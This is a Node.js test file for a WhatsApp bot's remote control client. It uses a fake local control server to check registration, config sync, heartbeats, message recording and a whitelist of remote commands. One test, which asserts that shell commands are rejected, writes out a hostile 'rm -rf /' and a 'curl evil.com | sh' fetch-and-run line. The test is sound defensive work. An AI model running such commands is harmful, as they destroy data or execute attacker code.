import test from 'node:test'
import assert from 'node:assert/strict'
import http from 'http'

// Fast DB failures (read before any config import loads .env)
process.env.DATABASE_URL = 'postgresql://x:x@127.0.0.1:1/x'

// ─── Fake control server ───────────────────────────────────────────────────────
// Captures every request so the test can assert on the transport's payloads.
const requests = []
let failMode = false // when true, the server answers 500s

const server = http.createServer((req, res) => {
  let body = ''
  req.on('data', (chunk) => (body += chunk))
  req.on('end', () => {
    const parsed = body ? JSON.parse(body) : {}
    requests.push({ path: req.url, method: req.method, body: parsed })
    if (failMode) {
      res.writeHead(500, { 'Content-Type': 'application/json' })
      return res.end(JSON.stringify({ ok: false, error: 'boom' }))
    }
    const payload = { ok: true }
    if (req.url === '/api/v1/sessions/register') {
      payload.session = { id: parsed.session_id, status: 'active' }
      payload.features = { privacy_mode: false, ai: false, commands: true }
      payload.config = { botEnabled: true, privacyMode: false, autoReply: false, typingIndicator: false }
    } else if (req.url === '/api/v1/config') {
      payload.config = { botEnabled: false, privacyMode: true, autoReply: true, typingIndicator: true }
    } else if (req.url === '/api/v1/heartbeat') {
      payload.lastSeen = new Date().toISOString()
    } else if (req.url === '/api/v1/messages') {
      payload.recorded = true
    } else if (req.url === '/api/v1/commands/poll') {
      payload.commands = [
        { id: 'cmd-1', type: 'PAUSE_OUTBOUND', payload: null },
        { id: 'cmd-2', type: 'TOTALLY_UNKNOWN', payload: null },
        { id: 'cmd-3', type: 'SYNC_STATUS', payload: null },
      ]
    } else if (req.url === '/api/v1/commands/ack') {
      payload.acked = parsed.command_id ?? parsed.commandId
    }
    res.writeHead(200, { 'Content-Type': 'application/json' })
    res.end(JSON.stringify(payload))
  })
})

await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
const controlUrl = `http://127.0.0.1:${server.address().port}`

// ─── Remote client env — MUST be set before importing remote.js (config reads
//     these at module load, and loadEnvFile never overrides existing vars) ─────
process.env.SESSION_ID = 'TEST1234'
process.env.SESSION_SECRET = 'test-secret'
process.env.CONTROL_URL = controlUrl

const remote = await import('../lib/remote.js')
const { setKillSwitch, isKillSwitchOn, setOutboundPaused, isOutboundPaused } = await import('../lib/abuse.js')
const { setRuntimeOverride, getRuntimeFlag } = await import('../lib/runtime.js')
const {
  getPrivacySettings,
  setPrivacySettings,
  setPrivacyProvider,
} = await import('../lib/privacy.js')
const { recordMessage } = await import('../lib/messageService.js')

const lastRequest = () => requests[requests.length - 1]
const requestCount = () => requests.length

test('remote client is detected from env credentials', () => {
  assert.equal(remote.isRemoteClient, true)
})

test('remoteRegister posts credentials and returns config + features', async () => {
  const count = requestCount()
  const reg = await remote.remoteRegister()

  assert.ok(reg.ok)
  assert.equal(reg.session.id, 'TEST1234')
  assert.equal(reg.config.botEnabled, true)
  assert.equal(reg.features.commands, true)

  const req = requests[count] // the request just made
  assert.equal(req.path, '/api/v1/sessions/register')
  assert.equal(req.method, 'POST')
  assert.equal(req.body.session_id, 'TEST1234')
  assert.equal(req.body.secret, 'test-secret')
})

test('remoteFetchConfig returns the control-plane config', async () => {
  const cfg = await remote.remoteFetchConfig()
  assert.ok(cfg)
  assert.equal(cfg.botEnabled, false)
  assert.equal(cfg.privacyMode, true)
  const req = lastRequest()
  assert.equal(req.path, '/api/v1/config')
})

test('remoteHeartbeat posts status/version/uptime', async () => {
  const count = requestCount()
  await remote.remoteHeartbeat('connected', '2.0.0', 42)
  const req = requests[count]
  assert.equal(req.path, '/api/v1/heartbeat')
  assert.equal(req.body.status, 'connected')
  assert.equal(req.body.version, '2.0.0')
  assert.equal(req.body.uptime, 42)
})

test('remoteRecordMessage posts the message and is non-fatal on failure', async () => {
  const count = requestCount()
  await remote.remoteRecordMessage({
    remoteJid: '1555@s.whatsapp.net',
    messageId: 'MSG-1',
    senderJid: '1555@s.whatsapp.net',
    msgType: 'conversation',
    content: 'hello',
    fromMe: false,
  })
  const req = requests[count]
  assert.equal(req.path, '/api/v1/messages')
  assert.equal(req.body.message.messageId, 'MSG-1')

  // Server failure must not throw (fire-and-forget transport)
  failMode = true
  let threw = false
  try {
    await remote.remoteRecordMessage({ remoteJid: 'x', messageId: 'y' })
  } catch {
    threw = true
  }
  failMode = false
  assert.equal(threw, false)
})

test('remoteRegister rejects when the control plane is down or unauthorized', async () => {
  failMode = true
  await assert.rejects(() => remote.remoteRegister(), /boom|Registration failed/)
  failMode = false
})

test('remoteFetchConfig returns null when the poll fails', async () => {
  failMode = true
  const cfg = await remote.remoteFetchConfig()
  failMode = false
  assert.equal(cfg, null)
})

test('applyRemoteBotConfig drives kill switch, privacy, and runtime flags', async () => {
  remote.applyRemoteBotConfig({
    botEnabled: false,
    privacyMode: true,
    autoReply: true,
    typingIndicator: true,
  })
  assert.equal(isKillSwitchOn(), true)
  assert.equal(getRuntimeFlag('autoChatbot'), true)
  assert.equal(getRuntimeFlag('autoTyping'), true)
  const privacy = await getPrivacySettings()
  assert.equal(privacy.enabled, true)
  assert.equal(privacy.level, 'privacy')

  // Restore outbound when botEnabled flips back
  remote.applyRemoteBotConfig({
    botEnabled: true,
    privacyMode: false,
    autoReply: false,
    typingIndicator: false,
  })
  assert.equal(isKillSwitchOn(), false)
  assert.equal(getRuntimeFlag('autoChatbot'), false)

  // Reset module state so later tests in this file are unaffected
  setKillSwitch(false)
  setRuntimeOverride('autoChatbot', null)
  setRuntimeOverride('autoTyping', null)
  setPrivacyProvider(null)
  await setPrivacySettings({ level: 'normal' })
})

test('remotePollCommands claims pending commands from the control plane', async () => {
  const commands = await remote.remotePollCommands()
  assert.equal(commands.length, 3)
  assert.equal(commands[0].type, 'PAUSE_OUTBOUND')
  assert.equal(commands[1].type, 'TOTALLY_UNKNOWN')
  const req = lastRequest()
  assert.equal(req.path, '/api/v1/commands/poll')
})

test('executeRemoteCommand runs whitelisted commands (PAUSE_OUTBOUND)', async () => {
  const outcome = await remote.executeRemoteCommand({ id: 'cmd-1', type: 'PAUSE_OUTBOUND' })
  assert.equal(outcome.handled, true)
  assert.equal(outcome.ok, true)
  assert.equal(isOutboundPaused(), true)
  // Cleanup so later tests are unaffected
  await remote.executeRemoteCommand({ id: 'x', type: 'RESUME_OUTBOUND' })
  assert.equal(isOutboundPaused(), false)
})

test('executeRemoteCommand rejects unknown command types (no arbitrary execution)', async () => {
  const outcome = await remote.executeRemoteCommand({ id: 'cmd-2', type: 'TOTALLY_UNKNOWN' })
  assert.equal(outcome.handled, false)
  assert.match(outcome.reason, /unknown command type/)
})

test('executeRemoteCommand cannot execute shell commands', async () => {
  const shellAttempt = await remote.executeRemoteCommand({
    id: 'evil',
    type: 'exec',
    payload: { command: 'rm -rf /' },
  })
  assert.equal(shellAttempt.handled, false)
  const shellAttempt2 = await remote.executeRemoteCommand({
    id: 'evil2',
    type: 'SYSTEM',
    payload: { cmd: 'curl evil.com | sh' },
  })
  assert.equal(shellAttempt2.handled, false)
})

test('executeRemoteCommand SYNC_STATUS reports via the status provider', async () => {
  remote.setSyncStatusProvider(() => ({ whatsapp: 'connected', botStatus: 'running' }))
  const outcome = await remote.executeRemoteCommand({ id: 'cmd-3', type: 'SYNC_STATUS' })
  assert.equal(outcome.ok, true)
  assert.equal(outcome.result.status.whatsapp, 'connected')
  remote.setSyncStatusProvider(null)
})

test('remoteAckCommand acks command results (non-fatal on failure)', async () => {
  const count = requestCount()
  await remote.remoteAckCommand('cmd-1', true, { done: true })
  const req = requests[count]
  assert.equal(req.path, '/api/v1/commands/ack')
  assert.equal(req.body.command_id, 'cmd-1')
  assert.equal(req.body.ok, true)

  // Server failure must not throw (fire-and-forget transport)
  failMode = true
  let threw = false
  try {
    await remote.remoteAckCommand('cmd-1', false, { error: 'x' })
  } catch {
    threw = true
  }
  failMode = false
  assert.equal(threw, false)
  // The failed attempt was still recorded as a request (transport alive)
  assert.equal(lastRequest().path, '/api/v1/commands/ack')
})

test('initRemoteTransports wires message persistence through the control API', async () => {
  remote.initRemoteTransports()
  const count = requestCount()
  await recordMessage({
    remoteJid: '1777@s.whatsapp.net',
    messageId: 'TRANSPORT-1',
    senderJid: '1777@s.whatsapp.net',
    msgType: 'conversation',
    content: 'via recorder',
    fromMe: false,
  })
  const req = requests[count]
  assert.equal(req.path, '/api/v1/messages')
  assert.equal(req.body.message.messageId, 'TRANSPORT-1')
})

test.after(() => {
  server.close()
})
